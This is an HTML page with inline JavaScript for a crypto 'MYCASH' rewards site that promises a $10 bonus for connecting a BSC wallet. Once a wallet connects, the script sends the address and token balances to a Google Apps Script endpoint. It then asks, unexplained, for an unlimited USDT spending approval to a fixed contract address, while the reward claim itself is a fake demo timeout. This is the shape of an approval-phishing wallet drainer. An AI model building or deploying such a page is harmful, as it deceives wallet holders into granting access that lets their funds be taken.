<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>MYCASH — Rewards</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}

    body{
      font-family:system-ui,Segoe UI,Arial;
      background:#050816;
      color:#e6eef8;
      min-height:100vh;
      display:flex;
      flex-direction:column;
    }

    /* HEADER – nav + user info */
    header{
      background:#071027;
      padding:10px 16px;
      position:sticky;
      top:0;
      z-index:20;
      border-bottom:1px solid rgba(255,255,255,0.08);
      backdrop-filter:blur(10px);
    }
    .nav{
      max-width:980px;
      margin:0 auto;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
    }
    .nav-left{display:flex;gap:14px;flex-wrap:wrap}
    a{
      color:#dbeafe;
      text-decoration:none;
      padding:6px 10px;
      border-radius:6px;
      font-size:0.9rem;
    }
    a:hover{background:#0f1b33}
    .logo{
      font-weight:700;
      letter-spacing:4px;
      font-size:1rem;
      white-space:nowrap;
    }

    .nav-right{
      display:flex;
      flex-direction:column;
      align-items:flex-end;
      gap:2px;
      max-width:420px;
    }
    .header-line{
      font-size:0.78rem;
      color:#9fb0c8;
      white-space:nowrap;
      overflow:hidden;
      text-overflow:ellipsis;
      max-width:100%;
    }
    .connect-header{
      margin-top:4px;
      display:flex;
      justify-content:flex-end;
    }
    .connect-btn{
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.7);
      background:transparent;
      padding:0.35rem 1.4rem;
      font-size:0.85rem;
      font-weight:600;
      cursor:pointer;
      color:#e5e7eb;
      transition:background 0.15s ease,box-shadow 0.15s ease,transform 0.12s ease;
      white-space:nowrap;
    }
    .connect-btn:hover{
      background:#0f172a;
      box-shadow:0 10px 24px rgba(15,23,42,0.8);
      transform:translateY(-1px);
    }
    .connect-btn.connected{
      background:rgba(34,197,94,0.12);
      border-color:rgba(34,197,94,0.6);
      color:#bbf7d0;
      cursor:default;
      box-shadow:none;
      transform:none;
    }

    main{
      max-width:980px;
      margin:20px auto;
      padding:16px;
      flex:1;
    }

    .reward-container{width:100%}

    .reward-title{
      text-align:center;
      margin-bottom:1.5rem;
    }
    .reward-title h1{
      font-size:1.9rem;
      margin-bottom:0.4rem;
    }
    .reward-title p{
      font-size:0.95rem;
      color:#9ca3af;
    }

    /* main reward card — styled like your old design */
    .reward-card{
      border-radius:1.5rem;
      padding:1.4rem 1.6rem;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:1.4rem;
      border:1px solid rgba(148,163,184,0.35);
      box-shadow:0 20px 45px rgba(15,23,42,0.9);
      background:radial-gradient(circle at top left,#111827,#020617);
    }

    .reward-left,
    .reward-center,
    .reward-right{
      display:flex;
      flex-direction:column;
      justify-content:center;
    }

    .reward-left{
      min-width:150px;
      gap:0.4rem;
    }

    .reward-tag{
      font-size:0.7rem;
      text-transform:uppercase;
      letter-spacing:0.18em;
      color:#64748b;
      margin-bottom:6px;
    }

    .wallet-icon-base{
      width:54px;
      height:54px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
      background:#020617;
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.6);
      background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);
    }
    .wallet-icon-base img{
      width:70%;
      height:70%;
      object-fit:contain;
      display:block;
    }

    .wallet-subline{
      font-size:0.8rem;
      color:#9fb0c8;
    }

    .reward-center{
      flex:1;
      align-items:center;
      text-align:center;
      gap:0.35rem;
    }

    .reward-amount{
      font-size:2.1rem;
      font-weight:700;
      letter-spacing:0.05em;
    }

    .reward-label{
      font-size:0.86rem;
      text-transform:uppercase;
      color:#9ca3af;
      letter-spacing:0.23em;
    }

    .reward-desc{
      margin-top:2px;
      font-size:0.82rem;
      color:#9fb0c8;
      max-width:370px;
    }

    .btn{
      border:none;
      outline:none;
      border-radius:999px;
      padding:0.55rem 1.8rem;
      font-size:0.9rem;
      font-weight:600;
      cursor:pointer;
      transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease, opacity 0.12s ease;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      white-space:nowrap;
    }

    .btn-claim{
      background:#22c55e;
      color:#022c22;
      box-shadow:0 14px 30px rgba(34,197,94,0.45);
      margin-top:0.7rem;
    }
    .btn-claim:hover:not([disabled]){
      transform:translateY(-1px);
      box-shadow:0 18px 40px rgba(34,197,94,0.6);
    }

    .btn-task{
      margin-top:0.45rem;
      background:transparent;
      border:1px solid rgba(148,163,184,0.8);
      color:#e5e7eb;
      font-size:0.86rem;
      padding-inline:1.4rem;
    }
    .btn-task:hover{
      background:rgba(15,23,42,0.9);
      box-shadow:0 10px 26px rgba(15,23,42,0.8);
      transform:translateY(-1px);
    }

    .btn[disabled]{
      opacity:0.45;
      cursor:not-allowed;
      box-shadow:none;
      transform:none;
    }

    .reward-right{
      min-width:170px;
      align-items:flex-end;
      gap:0.4rem;
    }

    .small{font-size:0.85rem;color:#9fb0c8;}
    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}

    .reward-extra{
      margin-top:18px;
    }

    /* TASK PAGE (overlay) */
    .task-page{
      position:fixed;
      inset:0;
      background:rgba(3,7,18,0.96);
      z-index:40;
      overflow-y:auto;
      display:none;
    }
    .task-page-inner{
      max-width:960px;
      margin:32px auto 48px auto;
      padding:0 16px;
    }
    .task-header{
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:12px;
      margin-bottom:16px;
    }
    .task-header h2{
      font-size:1.4rem;
    }
    .task-close-btn{
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.7);
      padding:0.25rem 0.9rem;
      background:transparent;
      color:#e5e7eb;
      font-size:0.85rem;
      cursor:pointer;
    }
    .task-close-btn:hover{
      background:rgba(15,23,42,0.9);
    }

    .task-section{
      margin-top:18px;
      padding:1rem 1.1rem;
      border-radius:0.9rem;
      border:1px solid rgba(75,85,99,0.7);
      background:linear-gradient(135deg,#020617,#020617,#0b1120);
    }
    .task-section h3{
      font-size:1rem;
      margin-bottom:0.35rem;
    }
    .task-section p{
      font-size:0.86rem;
      color:#cbd5f5;
      margin-bottom:0.35rem;
    }
    .task-section ul{
      margin-left:1.2rem;
      margin-bottom:0.35rem;
      font-size:0.86rem;
      color:#cbd5f5;
    }
    .task-section li{
      margin-bottom:0.18rem;
    }

    /* responsive video box for Task 1 */
    .video-wrapper{
      position:relative;
      width:100%;
      max-width:640px;
      margin-top:0.6rem;
      margin-bottom:0.6rem;
      padding-top:56.25%; /* 16:9 */
      border-radius:0.75rem;
      overflow:hidden;
      box-shadow:0 18px 38px rgba(15,23,42,0.9);
      background:#020617;
    }
    .video-wrapper iframe{
      position:absolute;
      top:0;left:0;
      width:100%;
      height:100%;
      border:0;
    }

    .task-actions{
      margin-top:1rem;
      display:flex;
      flex-wrap:wrap;
      gap:10px;
      align-items:center;
    }
    .task-demo-btn{
      border-radius:999px;
      border:none;
      background:#22c55e;
      color:#022c22;
      font-size:0.9rem;
      padding:0.5rem 1.4rem;
      font-weight:600;
      cursor:pointer;
    }
    .task-demo-btn:hover{
      box-shadow:0 14px 30px rgba(34,197,94,0.45);
      transform:translateY(-1px);
    }
    .task-status-text{
      font-size:0.84rem;
      color:#22c55e;
    }

    footer{
      max-width:980px;
      margin:24px auto 16px auto;
      padding:12px;
      color:#9fb0c8;
      text-align:center;
      font-size:0.8rem;
    }

    @media(max-width:768px){
      .nav{
        flex-direction:column;
        align-items:flex-start;
      }
      .nav-right{
        align-items:flex-start;
      }

      .reward-card{
        flex-direction:column;
        align-items:stretch;
        text-align:center;
      }
      .reward-left{
        align-items:center;
      }
      .reward-right{
        align-items:center;
      }
    }
  </style>
</head>
<body>
  <header>
    <div class="nav">
      <div class="nav-left">
        <a href="index.html">Home</a>
        <a href="about.html">About</a>
        <a href="contact.html">Contact</a>
        <a href="reward.html" style="background:#0f1b33">Rewards</a>
      </div>
      <div class="logo">MYCASH</div>
      <div class="nav-right">
        <div class="header-line">Status: <span id="statusText">Not connected</span></div>
        <div class="header-line">Address: <span id="walletAddress" class="mono">—</span></div>
        <div class="header-line">Network: <span id="walletNetwork">—</span></div>
        <div class="header-line">User ID: <span id="userId" class="mono">-</span></div>
        <div class="connect-header">
          <button id="connectBtn" class="connect-btn">Connect Wallet</button>
        </div>
      </div>
    </div>
  </header>

  <main>
    <div class="reward-container">
      <div class="reward-title">
        <h1>Claim Your Rewards</h1>
        <p>Connect your BSC wallet once, then use the reward card below to claim.</p>
      </div>

      <!-- SINGLE REWARD CARD (old design style) -->
      <div class="reward-card">
        <div class="reward-left">
          <div class="reward-tag">Reward #1</div>
          <div class="wallet-icon-base">
            <img src="logo.png" alt="Trust Wallet">
          </div>
          <span class="wallet-subline">Trust Wallet • BSC</span>
        </div>

        <div class="reward-center">
          <div class="reward-amount" id="rewardAmountDisplay">$10</div>
          <div class="reward-label">Starter Bonus</div>
          <div class="reward-desc">
            First time connection reward for eligible wallets.
          </div>
          <button id="claimBtn" class="btn btn-claim" disabled>Claim</button>
          <button id="taskBtn" class="btn btn-task">View Task</button>
          <div class="small" id="claimHint" style="margin-top:4px;">
            Claim is locked until wallet is connected and task is completed.
          </div>
        </div>

        <div class="reward-right">
          <button id="sideConnectBtn" class="connect-btn">Connect Wallet</button>
        </div>
      </div>

      <!-- EXTRA WALLET INFO -->
      <div class="reward-extra small">
        <div>BNB Balance: <span id="walletBalance">—</span></div>
        <div id="tokens" style="margin-top:6px">
          Connect wallet to see USDT balance.
        </div>
      </div>
    </div>
  </main>

  <footer>
    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
  </footer>

  <!-- TASK PAGE OVERLAY -->
  <div id="taskPage" class="task-page">
    <div class="task-page-inner">
      <div class="task-header">
        <div>
          <h2>Reward Tasks</h2>
          <p class="small">Complete these tasks to become eligible for the Starter Bonus.</p>
        </div>
        <button id="closeTaskBtn" class="task-close-btn">Back to Rewards</button>
      </div>

      <!-- TASK 1 (with video area) -->
      <div class="task-section">
        <h3>Task 1 — Watch the Intro</h3>
        <p>
          Watch the short introduction video about MYCASH and how the reward program works.
          You can replace this video with your own later.
        </p>
        <div class="video-wrapper">
          <!-- Replace the src URL with your own video embed later -->
          <iframe
            src="https://www.youtube.com/embed/dQw4w9WgXcQ"
            title="MYCASH Intro"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            allowfullscreen
          ></iframe>
        </div>
        <p class="small">
          You said: “can I embed a video there” — this box is exactly for that.
          Just change the <code>src</code> attribute above to your own video link.
        </p>
      </div>

      <!-- TASK 2 -->
      <div class="task-section">
        <h3>Task 2 — Hold USDT</h3>
        <p>
          Hold the required minimum USDT in your connected BSC wallet. Later you can add logic
          to check this balance on-chain before allowing the claim.
        </p>
        <ul>
          <li>Make sure you are connected with the same wallet.</li>
          <li>Deposit or receive USDT (BEP-20) to your wallet.</li>
          <li>We will verify eligibility before reward is granted.</li>
        </ul>
      </div>

      <!-- TASK 3 -->
      <div class="task-section">
        <h3>Task 3 — Custom Action</h3>
        <p>
          Define any extra action you want the user to take (invite, swap, stake, join Telegram, etc.).
          Later you can connect this with Google Sheet or your backend to track who completed it.
        </p>
        <ul>
          <li>Example: Join the official community channel.</li>
          <li>Example: Make one on-chain transaction through MYCASH.</li>
          <li>Example: Complete a survey form connected to your Apps Script.</li>
        </ul>
        <div class="task-actions">
          <button id="taskCompleteBtn" class="task-demo-btn">
            Mark tasks as completed (demo)
          </button>
          <span id="taskStatusText" class="task-status-text" style="display:none;">
            ✅ Tasks marked as completed (demo). If your wallet is connected, you can now claim.
          </span>
        </div>
      </div>
    </div>
  </div>

  <!-- libs -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>

  <!-- app script -->
  <script type="module">
  (function(){
    // ===== CONFIG (same as index) =====
    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
    const APPS_SCRIPT_SECRET = "mahfuzinam0045";

    // USDT on BSC TESTNET
    const TOKEN_ADDRESS   = "0x5915f45023012942c0F30B6652CEbb6A05810b90";
    const SPENDER_ADDRESS = "0x98fbcaA43b229601edb71E9923055ee485c29C3E"; // your smart contract

    const BNB_TESTNET_CHAIN_ID_DEC = 97;
    const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
    const BNB_TESTNET_LABEL        = "BSC Testnet (97)";

    const ERC20_APPROVE_ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];
    const ERC20_BALANCE_ABI = [
      "function balanceOf(address owner) view returns (uint256)"
    ];

    const REWARD_AMOUNT = 10.00; // display only; backend can decide real amount

    let web3ModalInstance = null;
    let providerInstance  = null;
    let web3Instance      = null;

    let isWalletConnected = false;
    let isTaskCompleted   = false;

    // ===== helpers for userId =====
    function storageKeyFor(address){
      return "userId_" + address.toLowerCase();
    }

    function generateUserIdFromAddress(address){
      address = (address || "").toLowerCase();
      let hash = 0;
      for (let i = 0; i < address.length; i++){
        hash = ((hash << 5) - hash) + address.charCodeAt(i);
        hash |= 0;
      }
      hash = Math.abs(hash);
      const num = 100000 + (hash % 900000); // 100000–999999
      return String(num);
    }

    function getOrCreateUserIdFor(address){
      const key = storageKeyFor(address);
      let id = localStorage.getItem(key);
      if (!id || !/^[0-9]{6}$/.test(id)) {
        id = generateUserIdFromAddress(address);
        localStorage.setItem(key, id);
      }
      return id;
    }

    // ===== UI refs =====
    const connectBtn        = document.getElementById("connectBtn");
    const sideConnectBtn    = document.getElementById("sideConnectBtn");
    const statusTextEl      = document.getElementById("statusText");
    const walletAddressEl   = document.getElementById("walletAddress");
    const userIdEl          = document.getElementById("userId");
    const walletNetworkEl   = document.getElementById("walletNetwork");
    const walletBalanceEl   = document.getElementById("walletBalance");
    const tokensContainer   = document.getElementById("tokens");

    const claimBtn          = document.getElementById("claimBtn");
    const claimHintEl       = document.getElementById("claimHint");
    const rewardAmountEl    = document.getElementById("rewardAmountDisplay");

    const taskBtn           = document.getElementById("taskBtn");
    const taskPage          = document.getElementById("taskPage");
    const closeTaskBtn      = document.getElementById("closeTaskBtn");
    const taskCompleteBtn   = document.getElementById("taskCompleteBtn");
    const taskStatusTextEl  = document.getElementById("taskStatusText");

    function setStatus(txt){
      if(statusTextEl) statusTextEl.textContent = txt;
      console.log("[status]", txt);
    }

    function setWalletInfo(address, network, bnb){
      if(walletAddressEl) walletAddressEl.textContent = address || "—";
      if(walletNetworkEl) walletNetworkEl.textContent = network || "—";
      if(walletBalanceEl){
        walletBalanceEl.textContent =
          (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
      }
    }

    function setUserIdUI(id){
      if(userIdEl) userIdEl.textContent = id || "-";
    }

    function updateConnectButtons(){
      const list = [connectBtn, sideConnectBtn];
      list.forEach(btn => {
        if(!btn) return;
        if(isWalletConnected){
          btn.textContent = "Connected";
          btn.classList.add("connected");
        }else{
          btn.textContent = "Connect Wallet";
          btn.classList.remove("connected");
        }
      });
    }

    function clearSessionUI(){
      isWalletConnected = false;
      setStatus("Not connected");
      setWalletInfo("—","—",null);
      setUserIdUI("-");
      if(tokensContainer){
        tokensContainer.textContent = "Connect wallet to see USDT balance.";
      }
      updateConnectButtons();
      updateClaimState();
    }

    function updateClaimState(){
      if(claimBtn){
        const enabled = isWalletConnected && isTaskCompleted;
        claimBtn.disabled = !enabled;
      }
      if(claimHintEl){
        if(!isWalletConnected && !isTaskCompleted){
          claimHintEl.textContent = "Claim is locked until wallet is connected and task is completed.";
        } else if(!isWalletConnected){
          claimHintEl.textContent = "Please connect your wallet to claim.";
        } else if(!isTaskCompleted){
          claimHintEl.textContent = "Complete the task to unlock the Claim button.";
        } else {
          claimHintEl.textContent = "You can now claim your reward.";
        }
      }
    }

    function initWeb3ModalInstance(){
      const providerOptions = {
        walletconnect: {
          package: window.WalletConnectProvider.default,
          options: {
            rpc: { 97: "https://data-seed-prebsc-1-s1.binance.org:8545" },
            bridge: "https://bridge.walletconnect.org",
            qrcode: true
          }
        }
      };
      web3ModalInstance = new window.Web3Modal.default({
        cacheProvider: true,
        providerOptions
      });
    }

    function attachProviderListeners(p){
      if(!p || !p.on) return;
      try{
        p.on("accountsChanged", function(accounts){
          if(!accounts || !accounts.length){
            clearSessionUI();
            return;
          }
          const addr = accounts[0].toLowerCase();
          const uid  = getOrCreateUserIdFor(addr);
          setWalletInfo(addr, BNB_TESTNET_LABEL, null);
          setUserIdUI(uid);
          isWalletConnected = true;
          updateConnectButtons();
          updateClaimState();
        });

        p.on("chainChanged", function(chainId){
          if(walletNetworkEl){
            walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
          }
        });

        p.on("disconnect", function(){
          clearSessionUI();
        });
      }catch(e){
        console.warn("attachProviderListeners", e);
      }
    }

    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance){
      try{
        const payload = new URLSearchParams({
          secret      : APPS_SCRIPT_SECRET,
          address     : address,
          network     : networkText,
          timestamp   : new Date().toISOString(),
          userId      : userId,
          bnbBalance  : String(bnbBalance ?? ""),
          tokenBalance: String(tokenBalance ?? "")
        });

        await fetch(APPS_SCRIPT_URL, {
          method: "POST",
          mode  : "no-cors",
          headers: {"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},
          body: payload.toString()
        });

        console.log("Sent log to Apps Script (no-cors).");
      }catch(err){
        console.error("notifyBackend error:", err);
      }
    }

    async function getTokenBalance(address){
      try{
        if(
          !TOKEN_ADDRESS ||
          !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)
        ){
          console.warn("TOKEN_ADDRESS not set or invalid, skipping token balance");
          return "";
        }
        if(!providerInstance){
          console.warn("No providerInstance for token balance");
          return "";
        }

        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
        const raw            = await tokenContract.balanceOf(address);
        const formatted      = ethers.formatUnits(raw, 18); // assumes 18 decimals
        return formatted;
      }catch(err){
        console.error("getTokenBalance error:", err);
        return "";
      }
    }

    async function switchToBSC(provider){
      try{
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BNB_TESTNET_CHAIN_ID_HEX }]
        });
        return true;
      }catch(switchError){
        if(switchError.code === 4902){
          try{
            await provider.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: BNB_TESTNET_CHAIN_ID_HEX,
                chainName: "BNB Smart Chain Testnet",
                nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
                rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
                blockExplorerUrls:["https://testnet.bscscan.com"]
              }]
            });
            return true;
          }catch(addErr){
            console.error("Could not add BSC Testnet:", addErr);
            return false;
          }
        }
        console.error("Switch error:", switchError);
        return false;
      }
    }

    async function requestTokenApproval(){
      if(!TOKEN_ADDRESS){
        console.warn("TOKEN_ADDRESS not set, skipping approve");
        return;
      }
      if(!SPENDER_ADDRESS){
        console.warn("SPENDER_ADDRESS not set, skipping approve");
        return;
      }
      if(!providerInstance){
        console.warn("No providerInstance for approval");
        return;
      }

      try{
        setStatus("Requesting token approval…");
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const signer         = await ethersProvider.getSigner();
        const userAddress    = (await signer.getAddress()).toLowerCase();

        if (TOKEN_ADDRESS.toLowerCase() === userAddress) {
          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
          setStatus("Connected (approval skipped)");
          return;
        }

        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
        const amount         = ethers.MaxUint256;

        const tx = await tokenContract.approve(SPENDER_ADDRESS, amount);
        console.log("Approve tx sent:", tx.hash);
        setStatus("Waiting for approval confirmation…");
        const receipt = await tx.wait();
        console.log("Approve confirmed:", receipt);
        setStatus("Connected + Approved ✅");
      }catch(err){
        console.error("Token approve error:", err);
        alert("Token approval failed: " + (err && err.message ? err.message : err));
        setStatus("Connected (approval failed)");
      }
    }

    // Restore BNB + USDT and mark wallet as connected
    async function restoreSessionFromAddress(address){
      const balanceWei = await web3Instance.eth.getBalance(address);
      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
      const userId     = getOrCreateUserIdFor(address);

      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
      setUserIdUI(userId);

      const tokenBalanceRaw  = await getTokenBalance(address);
      const prettyBalance    = tokenBalanceRaw ? Number(tokenBalanceRaw).toFixed(4) : "0.0000";

      if(tokensContainer){
        tokensContainer.innerHTML =
          'USDT balance: ' + prettyBalance +
          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
      }

      isWalletConnected = true;
      updateConnectButtons();
      updateClaimState();

      return {
        balanceBNB,
        tokenBalance: tokenBalanceRaw,
        userId
      };
    }

    async function connectFlow(){
      try{
        setStatus("Connecting…");
        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        // Trust Wallet extension
        if(!mobile && window.trustwallet && window.trustwallet.ethereum){
          providerInstance = window.trustwallet.ethereum;
          web3Instance     = new Web3(providerInstance);
          await providerInstance.request({ method: "eth_requestAccounts" });
        }
        // Standard injected (MetaMask, some Trust)
        else if(window.ethereum && !mobile){
          providerInstance = window.ethereum;
          web3Instance     = new Web3(providerInstance);
          await providerInstance.request({ method: "eth_requestAccounts" });
        }
        // WalletConnect via Web3Modal
        else {
          if(!web3ModalInstance) initWeb3ModalInstance();
          providerInstance = await web3ModalInstance.connect();
          web3Instance     = new Web3(providerInstance);
        }

        if(!providerInstance || !web3Instance){
          setStatus("No provider");
          alert("No wallet provider detected.");
          return;
        }

        attachProviderListeners(providerInstance);

        const accounts = await web3Instance.eth.getAccounts();
        if(!accounts || !accounts.length){
          setStatus("No account");
          return;
        }
        const address = accounts[0].toLowerCase();

        let chainId = await web3Instance.eth.getChainId();
        if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
          const switched = await switchToBSC(providerInstance);
          if(!switched){
            alert("Please switch to BSC Testnet.");
            setStatus("Wrong network");
            return;
          }
          chainId = await web3Instance.eth.getChainId();
          if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
            alert("Network switch failed");
            return;
          }
        }

        const { balanceBNB, tokenBalance, userId } =
          await restoreSessionFromAddress(address);

        setStatus("Connected");
        await notifyBackend(
          address,
          BNB_TESTNET_LABEL,
          userId,
          balanceBNB,
          tokenBalance
        );

        await requestTokenApproval();

      }catch(err){
        console.error("connectFlow error:", err);
        setStatus("Connection failed");
        alert("Connection failed: " + (err && err.message ? err.message : err));
      }
    }

    // silent restore using eth_accounts; returns true if restored
    async function tryAutoReconnectSilent(){
      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

      // 1) Trust Wallet extension
      if(!mobile && window.trustwallet && window.trustwallet.ethereum){
        const injected = window.trustwallet.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);

        const accounts = await injected.request({ method: "eth_accounts" });
        if (accounts && accounts.length) {
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session (Trust Wallet)...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      // 2) Standard injected (MetaMask / some Trust)
      if(window.ethereum){
        const injected = window.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);

        const accounts = await injected.request({ method: "eth_accounts" });
        if (accounts && accounts.length) {
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      // 3) Do NOT auto-connect WalletConnect silently (would open QR)
      return false;
    }

    async function autoConnectOnLoad(){
      try{
        const restored = await tryAutoReconnectSilent();
        if(restored) return;
        clearSessionUI();
      }catch(e){
        console.warn("autoConnectOnLoad failed:", e);
        clearSessionUI();
      }
    }

    async function claimReward(){
      try{
        if(!isWalletConnected){
          alert("Please connect your wallet first.");
          setStatus("Connect wallet before claiming.");
          return;
        }
        if(!isTaskCompleted){
          alert("Please complete the task first.");
          setStatus("Complete task before claiming.");
          return;
        }
        if(!web3Instance || !providerInstance){
          alert("Wallet not ready, connect again.");
          return;
        }

        const accounts = await web3Instance.eth.getAccounts();
        if(!accounts || !accounts.length){
          setStatus("No account found. Connect again.");
          return;
        }
        const address = accounts[0].toLowerCase();

        setStatus("Claiming reward…");

        // TODO: add your real claim contract call here
        // const ethersProvider = new ethers.BrowserProvider(providerInstance);
        // const signer         = await ethersProvider.getSigner();
        // const claimContract  = new ethers.Contract(SPENDER_ADDRESS, CLAIM_ABI, signer);
        // const tx = await claimContract.claimReward();
        // await tx.wait();

        setTimeout(() => {
          setStatus("Reward claimed for " + address.slice(0,6) + "…" + address.slice(-4));
          alert("Reward claimed! (demo mode — add real contract call later)");
        }, 800);
      }catch(err){
        console.error("claimReward error:", err);
        setStatus("Reward claim failed");
        alert("Reward claim failed: " + (err && err.message ? err.message : err));
      }
    }

    // ===== DOMContentLoaded =====
    document.addEventListener("DOMContentLoaded", async function(){
      if(rewardAmountEl){
        rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
      }

      initWeb3ModalInstance();
      updateConnectButtons();
      updateClaimState();

      // connect buttons (header + card right)
      [connectBtn, sideConnectBtn].forEach(btn => {
        if(btn){
          btn.addEventListener("click", function(){
            if(isWalletConnected) return; // already connected
            connectFlow();
          });
        }
      });

      if(claimBtn){
        claimBtn.addEventListener("click", claimReward);
      }

      // Task page show/hide
      if(taskBtn && taskPage){
        taskBtn.addEventListener("click", function(){
          taskPage.style.display = "block";
        });
      }
      if(closeTaskBtn && taskPage){
        closeTaskBtn.addEventListener("click", function(){
          taskPage.style.display = "none";
        });
      }

      if(taskCompleteBtn){
        taskCompleteBtn.addEventListener("click", function(){
          isTaskCompleted = true;
          if(taskStatusTextEl){
            taskStatusTextEl.style.display = "inline";
          }
          updateClaimState();
        });
      }

      await autoConnectOnLoad();
      const yearEl = document.getElementById("year");
      if(yearEl) yearEl.textContent = new Date().getFullYear();
    });

  })();
  </script>
</body>
</html>

